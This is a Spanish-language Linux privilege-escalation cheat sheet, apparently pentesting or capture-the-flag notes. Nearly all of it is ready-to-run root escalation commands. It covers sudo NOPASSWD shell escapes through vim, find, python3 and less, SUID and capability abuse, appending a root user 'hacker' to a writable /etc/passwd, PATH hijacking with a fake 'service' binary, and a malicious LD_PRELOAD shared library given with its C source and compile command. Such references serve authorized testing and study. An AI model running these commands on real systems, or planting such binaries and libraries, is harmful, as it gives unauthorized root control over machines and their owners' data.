--- SUDO ---

# Ver permisos sudo sin password
sudo -l

# Si aparece (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# Si aparece (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# Si aparece (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# Si aparece (ALL) NOPASSWD: /usr/bin/less / more / man
sudo less /etc/passwd    # dentro: !/bin/bash

# GTFOBins para cualquier binario: https://gtfobins.github.io


--- SUID / SGID ---

# Buscar binarios con SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Buscar SGID
find / -perm -2000 -type f 2>/dev/null

# Combinado SUID + SGID
find / -perm /6000 -type f 2>/dev/null

# Binarios SUID interesantes:
#   /usr/bin/bash       bash -p  (shell como owner)
#   /usr/bin/find       find / -exec /bin/bash -p \;
#   /usr/bin/vim        vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
#   /usr/bin/python     python -c 'import os; os.execl("/bin/sh","sh","-p")'
#   /usr/bin/nmap       nmap --interactive  ->  !sh
#   /usr/bin/cp         cp /bin/bash /tmp/bash; /tmp/bash -p
#   /usr/bin/env        env /bin/bash -p


--- CAPABILITIES ---
# Permisos granulares del kernel asignados a binarios concretos.
# En vez de darle SUID completo a un binario, se le da solo la capacidad
# necesaria (ej: cap_setuid para cambiar de UID). Si está mal configurado,
# se puede abusar para escalar a root igual que con SUID.

# Buscar binarios con capabilities
getcap -r / 2>/dev/null

# Ejemplo explotable: python3 con cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'


--- CRON JOBS ---
# Tareas programadas que se ejecutan automáticamente cada cierto tiempo.
# Si un script que ejecuta root tiene permisos de escritura para otros
# usuarios, podemos modificarlo para que ejecute nuestra shell.

# Ver crontab del usuario actual
crontab -l

# Crontabs del sistema
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*

# Buscar procesos ejecutándose periódicamente (pspy)
./pspy64


--- FICHEROS CON PERMISOS DÉBILES ---

# Ficheros escribibles por todos
find / -writable -type f 2>/dev/null | grep -v proc
find / -perm -o+w -type f 2>/dev/null

# Directorios escribibles
find / -writable -type d 2>/dev/null

# Ficheros importantes que podrían ser escribibles
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers

# Si /etc/passwd es escribible: añadir usuario root
echo 'hacker:$(openssl passwd hacked):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: hacked

--- BINARIOS CON PATH HIJACKING ---
# Si un script ejecutado por root llama a un comando sin ruta absoluta
# (ej: "service" en vez de "/usr/sbin/service"), podemos crear un binario
# malicioso con ese nombre y ponerlo antes en el PATH para que root
# ejecute el nuestro en su lugar.

# Ver PATH del sistema
echo $PATH

# Crear binario malicioso en directorio con escritura antes en PATH
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Ahora cuando el script llame a "service", ejecutará el nuestro

--- VARIABLES DE ENTORNO Y LD_PRELOAD ---
# LD_PRELOAD fuerza al sistema a cargar una librería antes que cualquier otra.
# Si sudo conserva esta variable (env_keep+=LD_PRELOAD), podemos inyectar
# una librería maliciosa que se ejecute con los privilegios del comando sudo.

# Verificar: sudo -l debe mostrar env_keep+=LD_PRELOAD

cat > /tmp/malicious.c << CEOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
CEOF
gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles
sudo LD_PRELOAD=/tmp/malicious.so find
